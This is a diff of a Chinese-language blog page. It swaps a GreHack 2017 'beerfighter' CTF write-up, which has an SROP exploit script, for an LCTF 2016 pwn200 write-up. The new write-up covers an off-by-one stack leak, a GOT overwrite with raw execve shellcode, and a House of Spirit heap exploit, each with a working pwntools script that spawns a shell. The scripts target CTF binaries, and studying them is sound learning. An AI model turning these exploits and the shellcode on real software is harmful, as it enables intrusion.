@@ -77,7 +77,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/11/23/grehack-ctf-2017-beerfighter/"/>
+    <link rel="canonical" href="http://example.com/2025/12/15/lctf2016-pwn200/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -87,14 +87,14 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="grehack-ctf-2017_beerfighter">
-<meta property="og:url" content="http://example.com/2025/11/23/grehack-ctf-2017-beerfighter/index.html">
+<meta property="og:title" content="lctf2016-pwn200">
+<meta property="og:url" content="http://example.com/2025/12/15/lctf2016-pwn200/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-11-23T08:14:58.000Z">
-<meta property="article:modified_time" content="2025-11-23T08:46:39.604Z">
+<meta property="article:published_time" content="2025-12-15T11:32:34.000Z">
+<meta property="article:modified_time" content="2025-12-15T13:26:40.588Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -110,7 +110,7 @@
     
     <title>
         
-            grehack-ctf-2017_beerfighter | A1ex&#39;s blogs.
+            lctf2016-pwn200 | A1ex&#39;s blogs.
         
     </title>
 
@@ -380,7 +380,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">grehack-ctf-2017_beerfighter</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">lctf2016-pwn200</h1>
 			</div>
 			
 		</div>
@@ -401,15 +401,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-11-23 16:14:58</span>
-        <span class="mobile">2025-11-23 16:14:58</span>
+        <span class="desktop">2025-12-15 19:32:34</span>
+        <span class="mobile">2025-12-15 19:32:34</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-23 16:46:39</span>
-            <span class="mobile">2025-11-23 16:46:39</span>
+            <span class="desktop">2025-12-15 21:26:40</span>
+            <span class="mobile">2025-12-15 21:26:40</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -447,12 +447,80 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="GreHack-CTF-2017-beerfighter"><a href="#GreHack-CTF-2017-beerfighter" class="headerlink" title="GreHack-CTF-2017_beerfighter"></a>GreHack-CTF-2017_beerfighter</h1><p>这个题目主要难点在于结合SROP以及栈转移，需要构造两次SROP来完成。</p>
-<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>1.老规矩还是首先看程序的二进制属性，发现只是个静态链接的二进制。</p>
-<p>2.使用ida分析后，发现在sub_400568函数中存在栈溢出。分配大小为0x410，但是复制过去2048</p>
-<p>3.可以简单的使用一下程序，发现只有在功能1，才有输入角色名的功能，也就是漏洞出现在这里</p>
-<p>4.进一步可以发现在该程序中 <code>.data</code>段可写，也存在 <code>pop rax; ret</code>、<code>syscall; ret</code>的gadgets，可用构造 <code>sigreturn</code>用来实现SROP</p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./beerfighter&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./beerfighter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your action number &gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your action number &gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your character name here &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入名称这里存在漏洞</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000040077a</span> <span class="comment"># pop rax; ret</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000400738</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为什么要这么构造？中间这里是0xf，也就是read的调用号，要使用系统调用需要给调用号，第一句pop_rax，将调用号保存在了rax中，然后ret会将程序执行到syscall_addr指向的地址</span></span><br><span class="line"><span class="comment">#即，先溢出，rbp-8的位置是pop rax，然后函数返回地址就会执行pop rax。rsp此时指向的是RBP-16</span></span><br><span class="line">sigreturn = p64(pop_rax) + p64(constants.SYS_rt_sigreturn) + p64(syscall_addr)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">1048</span> + sigreturn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是指定.data中</span></span><br><span class="line">data_addr = elf.get_section_by_name(<span class="string">&quot;.data&quot;</span>).header.sh_addr + <span class="number">0x20</span></span><br><span class="line">new_stack_addr = data_addr + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一阶段的frame构造：执行syscall时，内核会在用户空间上读取ucontext结构体，用这个结构体里的数据完全覆盖所有寄存器。而这个结构体就在syscall下一行，执行了ret后，rsp是直接指向结构体第一行的</span></span><br><span class="line">frame_read = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>) <span class="comment">#指定内核</span></span><br><span class="line">frame_read.rax = constants.SYS_read <span class="comment"># rax保存着调用号</span></span><br><span class="line">frame_read.rdi = constants.STDIN_FILENO <span class="comment">#标准输入，rdi保存从哪里开始读</span></span><br><span class="line">frame_read.rsi = data_addr <span class="comment">#rsi保存 写到哪里</span></span><br><span class="line">frame_read.rdx = <span class="built_in">len</span>(frame_execve) <span class="comment">#rdx保存读入的字节数</span></span><br><span class="line">frame_read.rsp = new_stack_addr <span class="comment"># 将rsp定位到新栈的sigreturn，等到syscall执行完成后，将会从这里继续执行</span></span><br><span class="line">frame_read.rip = syscall_addr <span class="comment">#rip指到syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2阶段的frame：从新栈中读出/bin/sh，然后执行</span></span><br><span class="line">frame_execve = SigreturnFrame(kernel = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = data_addr</span><br><span class="line">frame_execve.rsi = <span class="number">0</span></span><br><span class="line">frame_execve.rdx = <span class="number">0</span></span><br><span class="line">frame_execve.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#首先，发送第一段payload，执行后，syscall会执行read，等待输入，会将输入写到.data</span></span><br><span class="line">p.sendline(payload + <span class="built_in">bytes</span>(frame_read))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Type your action number &gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送第二段payload，被写到指定位置，此时第一阶段已经指定了rip、rsp，所以，依然是执行的syscall，然后由于rsp指向的sigreturn，又开始执行sigreturn</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + sigreturn + <span class="built_in">bytes</span>(frame_execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+			<h1 id="Lctf2016-pwn200"><a href="#Lctf2016-pwn200" class="headerlink" title="Lctf2016-pwn200"></a>Lctf2016-pwn200</h1><p>这个有多种解法，一种是直接覆盖某一函数的got表指向shellcode的位置实现getshell，一种是hos</p>
+<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><p>1.用checksec查看文件属性</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+
+<p>2.将程序拖入ida，即可发现在read处有问题，v2位于rbp-0x30的位置，而name会读入0x30个字符，且如果读入0x30个字符的话末尾不会有\x00，这样在printf的时候就会顺带leak出rbp的值</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int whoareyou()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 i; // [sp+10h] [bp-40h]@1</span><br><span class="line">  char v2[48]; // [sp+20h] [bp-30h]@2</span><br><span class="line"></span><br><span class="line">  puts(&quot;who are u?&quot;);</span><br><span class="line">  for ( i = 0LL; i &lt;= 47; ++i )		//最多输入48个字符,并保存在v2中</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;v2[i], 1uLL);</span><br><span class="line">    if ( v2[i] == &#x27;\n&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      v2[i] = 0;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%s, welcome to xdctf~\n&quot;, v2);		//打印输出的内容,如果v2没有\n,那么他就会一直读取直到遇到\n</span><br><span class="line">  puts(&quot;give me your id ~~?&quot;);</span><br><span class="line">  read_num_morty();				// 最多输入4个字符并保存在nptr中,并返回其数字,最多4位数</span><br><span class="line">  return givememoney();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>并且关键点来了，在sub_400A29中，由于重叠的问题，导致能够覆盖地址</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int sub_400A29()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // rdi@1</span><br><span class="line">  char buf; // [sp+0h] [bp-40h]@1</span><br><span class="line">  char *dest; // [sp+38h] [bp-8h]@1		//就是一个在rbp上一个地址</span><br><span class="line"></span><br><span class="line">  dest = (char *)malloc(0x40uLL);		//申请一块内存,并将其指针保存在rbp上一个地址</span><br><span class="line">  puts(&quot;give me money~&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40uLL);	//读取0x40,到&amp;buf,这里会将dest覆盖</span><br><span class="line">  v0 = dest;</span><br><span class="line">  strcpy(dest, &amp;buf);	//将读取的内容拷贝到dest中</span><br><span class="line">  ptr = dest;			//这个dest可以控制,prt可以控制</span><br><span class="line">  return sub_4009C4(v0, &amp;buf);	//	v0可以控制</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么现在的思路1：先写入shellcode和目标的got地址到buf这个区域，通过对大小的控制，让got地址覆盖dest的地址，这样当发生strcpy的时候，由于现在dest地址是got地址，因此，就会直接将shellcode复制到指定的got地址，我们选择printf的got，因为程序执行完sub_400A29后，会执行printf</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn200&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_got_plt = 0x0000000000602000</span><br><span class="line">shellocde= b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><br><span class="line">name = shellocde + b&quot;A&quot;*(48-len(shellocde))		#就是在输入名称的地方写入shellcode</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;who are u?\n&quot;,name)</span><br><span class="line">p.recvuntil(name)</span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(leak_addr))</span><br><span class="line">offset = 0x50</span><br><span class="line">target_addr = leak_addr - offset   				#根据leak出的地址找到shellcode的地址</span><br><span class="line">print(hex(target_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pl = b&quot;B&quot;*25 + p64(target_addr)  #shellcode</span><br><span class="line">pl += b&quot;A&quot; *24      #(0x40 - 33 - 8 + 1)</span><br><span class="line">pl += p64(0x602018)        #这个是free got的位置</span><br><span class="line"></span><br><span class="line">raw_input(&#x27;#&#x27;)</span><br><span class="line">p.sendline(pl)				#	p1就是buf空间,然后程序会运行strcpy(dest, &amp;buf);将free_got覆盖为shellcode</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来是思路2：利用hos 进行getshell，而hos利用需要条件</p>
+<blockquote>
+<p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
+<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于 <code>av-&gt;system_mem</code>。</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+<li></li>
+</ul>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p>
+<p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200217185939.png"
+                     
+                ></p>
+<p>（2）存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>（1）伪造堆块</p>
+<p>hos的主要意图就是在可控1及可控2构造好数据，将它伪造成一个fastbin。</p>
+<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
+<p>（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。</p>
+<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p>
+</blockquote>
+<p>buf的大小只有 0x40-0x8 &#x3D; 0x38，但是却读入了0x40字节，会覆盖掉dest的指针，而dest是一个堆指针，这样就满足了HOS利用条件之一 <code>存在可将堆变量指针覆盖指向为可控区域</code></p>
+<p>实际上另一个利用条件在 <code>sub_400A8E函数</code>输入ID的地方也得到了满足，只是由于IDA反编译的一些问题，没有显示出来，但是从汇编界面看的话能够看到程序将rax(里面存放的Myread函数的返回值，也就是咱们输入的ID)里的值存放到了 <code>rbp-0x38</code>的位置。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+------------+-----                                  -</span><br><span class="line">|    ...     | money(0x38) 实际读入0x40，能覆盖dest    ↑</span><br><span class="line">+------------+                               sub_400A29栈帧(0x40)</span><br><span class="line">|    dest    |                                       ↓</span><br><span class="line">+------------+-----                                  -</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----              -</span><br><span class="line">|    ...     |这里占0x18,是别的东西↑</span><br><span class="line">+------------+                   |</span><br><span class="line">|     ID     |           sub_400A8E栈帧(0x50)</span><br><span class="line">+------------+                   |</span><br><span class="line">|    ...     |   name(0x30)      ↓</span><br><span class="line">+------------+-----              -</span><br><span class="line">|     rbp    |   #这个rbp存的值实际上就是下面的rbp_addr，也就是main函数的栈底</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |        main栈帧(0x10)</span><br><span class="line">+------------+&lt;----rbp_addr</span><br></pre></td></tr></table></figure></div>
+
+<p>更清楚一点展示：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">内存地址 (Memory Address)</span><br><span class="line">             |</span><br><span class="line">             v</span><br><span class="line">+=========================================+  &lt;-- 栈底 (High Address)</span><br><span class="line">|                                         |</span><br><span class="line">|           main 函数的栈帧                |</span><br><span class="line">|       (Stack Frame for main)            |</span><br><span class="line">|                                         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Return Address (返回 main)              |  1. main 调用 call 指令时压入</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Saved RBP (main&#x27;s RBP)                 |  2. sub_400A8E 序言 push rbp 压入</span><br><span class="line">+=========================================+  &lt;-- sub_400A8E 的栈底 (概念上)</span><br><span class="line">|                                         |</span><br><span class="line">|         sub_400A8E 的局部变量            |</span><br><span class="line">|       (Local Vars of sub_400A8E)        |</span><br><span class="line">|                                         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Return Address (返回 sub_400A8E)        |  3. sub_400A8E 调用 call 指令时压入</span><br><span class="line">|  (地址指向 call sub_400A29 的下一条指令)    |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|  Saved RBP (sub_400A8E&#x27;s RBP)           |  4. sub_400A29 序言 push rbp 压入</span><br><span class="line">+=========================================+  &lt;-- 当前 RBP 寄存器指向这里！</span><br><span class="line">|                                         |</span><br><span class="line">|         sub_400A29 的局部变量            |</span><br><span class="line">|       (Local Vars of sub_400A29)        |</span><br><span class="line">|           [ Buffer / 变量 ]              |</span><br><span class="line">|                                         |</span><br><span class="line">+-----------------------------------------+  &lt;-- 当前 RSP 寄存器指向这里！</span><br><span class="line">             |</span><br><span class="line">             v</span><br><span class="line">        栈顶 (Low Address)</span><br></pre></td></tr></table></figure></div>
+
+<p>也就形成了：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/lctf2016-pwn200/1765801128818.png"
+                      alt="1765801128818"
+                ></p>
+<p>那么整体思路就成了：</p>
+<ol>
+<li>将shellcode输入到name中，通过 <code>off-by-one</code>漏洞打印出来main函数栈底，通过上面结构图能够算出shellcode的地址，选取一个处在money中的位置作为fake_chunk</li>
+<li>在money中伪造堆块size，在id里面输入的是下一个堆块的size(大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于 <code>av-&gt;system_mem</code>)，同时通过堆溢出漏洞覆盖掉dest</li>
+<li>free掉刚才伪造的堆块，使其进入fastbin</li>
+<li>申请堆块，申请出来以后还是在老位置。</li>
+<li>输入数据到刚申请的堆块中，覆盖掉rip，让其指向shellcode，完成劫持，执行shellcode。</li>
+</ol>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># p = remote(&#x27;127.0.0.1&#x27;, 7777)</span><br><span class="line">p = process(&#x27;./pwn200&#x27;)</span><br><span class="line"></span><br><span class="line">free_got = 0x0000000000602018</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)</span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += shellcode.ljust(48)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;who are u?\n&#x27;)</span><br><span class="line">p.send(payload)                                         #发送第一个payload,同时获取rbp</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">rbp_addr = u64(p.recvn(6).ljust(8, &#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">shellcode_addr = rbp_addr - 0x50                        #shellcode 的地址</span><br><span class="line">print &quot;shellcode_addr: &quot;, hex(shellcode_addr)</span><br><span class="line">fake_addr = rbp_addr - 0x90                             # 这个就是givememoney的返回地址</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;give me your id ~~?\n&#x27;)</span><br><span class="line">p.sendline(&#x27;32&#x27;)  # id</span><br><span class="line">p.recvuntil(&#x27;give me money~\n&#x27;)</span><br><span class="line"></span><br><span class="line"># data就是chunk中的内容(0x40)     32bytes padding + prev_size + size + padding + fake_addr</span><br><span class="line">data = p64(0)*5 + p64(0x41) + p64(0) + p64(fake_addr)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice : &#x27;)</span><br><span class="line">p.sendline(&#x27;2&#x27;)  # free(fake_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice : &#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)  # checkin malloc(fake_addr) #fake_addr</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;long?&#x27;)</span><br><span class="line">p.sendline(&#x27;48&#x27;)  # 48 + 16 = 64 = 0x40     ptr = malloc(48)</span><br><span class="line">p.recvline(&#x27;48&#x27;)</span><br><span class="line"></span><br><span class="line">data = &#x27;a&#x27; * 24 + p64(shellcode_addr)  #</span><br><span class="line">data = data.ljust(48, &#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;choice&#x27;)</span><br><span class="line">p.sendline(&#x27;3&#x27;)     #goodbye</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<ul>
+<li>注意这里shellcode的地址，可以根据前面的栈结构图来求得，<code>0x50 = 0x30(name) + 0x8(rbp) + 0x8(rip) + 0x10(main栈帧)</code></li>
+<li>0x90&#x3D;0x0+ dest +rbp + rip +sub_400A8E-main‘s rbp的大小，</li>
+<li>这个id的size没有太严格要求，只需要大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于 <code>av-&gt;system_mem</code></li>
+<li>这里选取p64(0x41)是因为这样能够使ID正好相当于我们伪造chunk的nextchunk的size</li>
+<li>这里前面用p64(0)有好处，就是能够使 <code>sub_400A29</code>中的 <code>strcpy(dest, &amp;buf);</code>不起作用。</li>
+</ul>
+<p>我们这里fake_addr主要是覆盖了dest，并且由于dest&#x3D;&#x3D; ptr，因此ptr也就指向了fake_addr上一行，当我们释放ptr的时候，就把0x41大小的块进行了释放进入fastbin</p>
+<p>再次申请后，我们可以对下面的rip进行修改，改成shellcode的地址&#x3D;24 &#x3D; 0x0+fake_addr+ rbp &#x3D; 3*8</p>
 
 		</div>
 
@@ -460,18 +528,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> grehack-ctf-2017_beerfighter</li>
+        <li><strong>Title:</strong> lctf2016-pwn200</li>
         <li><strong>Author:</strong> A1ex</li>
         <li><strong>Created at
-                :</strong> 2025-11-23 16:14:58</li>
+                :</strong> 2025-12-15 19:32:34</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-23 16:46:39
+                    :</strong> 2025-12-15 21:26:40
             </li>
         
         <li>
-            <strong>Link:</strong> https://havenoideal123.github.io/2025/11/23/grehack-ctf-2017-beerfighter/
+            <strong>Link:</strong> https://havenoideal123.github.io/2025/12/15/lctf2016-pwn200/
         </li>
         <li>
             <strong>
@@ -504,23 +572,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
